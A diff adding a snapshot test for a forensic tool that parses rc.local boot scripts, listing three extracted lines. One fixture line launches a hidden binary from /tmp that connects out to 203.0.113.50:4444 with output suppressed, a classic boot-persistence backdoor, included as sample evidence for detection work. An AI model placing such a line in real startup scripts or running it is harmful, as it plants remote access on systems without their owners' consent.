@@ -1,0 +1,7 @@
+---
+source: crates/nixcavate-artifacts/src/linux/boot_scripts.rs
+expression: "run(&RC_LOCAL, \"etc/rc.local\", &fixture(\"rc-local/rc.local\"), 0)"
+---
+{"host":"memory","artifact":"rc-local","source_path":"etc/rc.local","source_line":4,"text":"/usr/local/bin/tune-nic eth0"}
+{"host":"memory","artifact":"rc-local","source_path":"etc/rc.local","source_line":7,"text":"nohup /tmp/.hidden/agent --connect 203.0.113.50:4444 >/dev/null 2>&1 &"}
+{"host":"memory","artifact":"rc-local","source_path":"etc/rc.local","source_line":8,"text":"exit 0"}
